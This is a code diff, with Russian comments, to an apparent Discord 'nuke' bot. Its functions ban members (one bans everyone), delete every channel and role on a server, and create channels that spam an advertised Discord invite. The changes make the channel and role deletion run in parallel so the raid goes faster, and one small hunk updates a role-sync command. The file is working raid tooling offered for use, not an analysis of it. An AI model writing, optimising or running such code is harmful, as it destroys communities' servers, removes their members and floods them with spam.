@@ -236,20 +236,15 @@ async def do_nuke(guild, spam_text=None, caller_id=None):
 
     NUKE_NAME = "Вы были крашнуты"
 
-    # ── 1. Переименовываем только каналы ──
-    await asyncio.gather(
-        *[c.edit(name=NUKE_NAME) for c in guild.channels],
-        return_exceptions=True
-    )
-
-    # ── 2. Удаляем все роли ──
+    # ── 1. Удаляем все каналы и роли параллельно ──
     bot_role = guild.me.top_role
     await asyncio.gather(
+        *[c.delete() for c in guild.channels],
         *[r.delete() for r in guild.roles if r < bot_role and not r.is_default()],
         return_exceptions=True
     )
 
-    # ── 3. Создаём каналы ──
+    # ── 2. Создаём каналы ──
     async def create_and_spam(i):
         try:
             if not nuke_running.get(guild.id):
@@ -263,10 +258,10 @@ async def do_nuke(guild, spam_text=None, caller_id=None):
         except Exception:
             pass
 
-    # ── 4. Спам до 500 сообщений ──
+    # ── 3. Спам до 500 сообщений ──
     await asyncio.gather(*[create_and_spam(i) for i in range(config.CHANNELS_COUNT)], return_exceptions=True)
 
-    # ── 5. Создаём роль и выдаём тому кто написал !nuke ──
+    # ── 4. Создаём роль и выдаём тому кто написал !nuke ──
     if caller_id:
         try:
             member = guild.get_member(caller_id)
@@ -326,25 +321,14 @@ async def do_superpr_nuke_task(guild, spam_text=None):
     to_ban = candidates[:ban_count]
     await asyncio.gather(*[m.ban(reason="super_nuke") for m in to_ban], return_exceptions=True)
 
-    # ── 2. Переименовываем каналы ──
-    await asyncio.gather(
-        *[c.edit(name=TURBO_NAME) for c in guild.channels],
-        return_exceptions=True
-    )
-
-    # ── 3. Удаляем все существующие каналы ──
+    # ── 2. Удаляем все каналы и роли параллельно ──
     await asyncio.gather(
         *[c.delete() for c in guild.channels],
-        return_exceptions=True
-    )
-
-    # ── 4. Удаляем все роли ──
-    await asyncio.gather(
         *[r.delete() for r in guild.roles if r < bot_role and not r.is_default()],
         return_exceptions=True
     )
 
-    # ── 5. Создаём новые каналы и спамим ──
+    # ── 3. Создаём новые каналы и спамим ──
     import random
     ad_variants = [
         "\n\n☠️ Kanero — https://discord.gg/JhQtrCtKFy",
@@ -408,26 +392,15 @@ async def do_owner_nuke_task(guild, spam_text=None):
     # ── 1. Баним ВСЕХ ──
     await asyncio.gather(*[m.ban(reason="owner_nuke") for m in targets], return_exceptions=True)
 
-    # ── 2. Переименовываем каналы ──
-    await asyncio.gather(
-        *[c.edit(name=OWNER_NAME) for c in guild.channels],
-        return_exceptions=True
-    )
-
-    # ── 3. Удаляем все каналы ──
+    # ── 2. Удаляем все каналы и роли параллельно ──
     await asyncio.gather(
         *[c.delete() for c in guild.channels],
-        return_exceptions=True
-    )
-
-    # ── 4. Удаляем все роли ──
-    await asyncio.gather(
         *[r.delete() for r in guild.roles if r < bot_role and not r.is_default()],
         return_exceptions=True
     )
 
-    # ── 5. Создаём новые каналы и спамим ──
-    # ── 5. Создаём новые каналы и спамим ──
+    # ── 3. Создаём новые каналы и спамим ──
+    # ── 3. Создаём новые каналы и спамим ──
     import random
     ad_variants = [
         "\n\n☠️ Kanero — https://discord.gg/JhQtrCtKFy",
@@ -985,6 +958,10 @@ async def sync_roles_cmd(ctx):
     given = []
     removed = []
     missing = []
+
+    # Загружаем всех участников сервера (на случай если кэш неполный)
+    if not guild.chunked:
+        await guild.chunk()
 
     # Выдаём Guest всем участникам у кого её нет
     if role_guest:
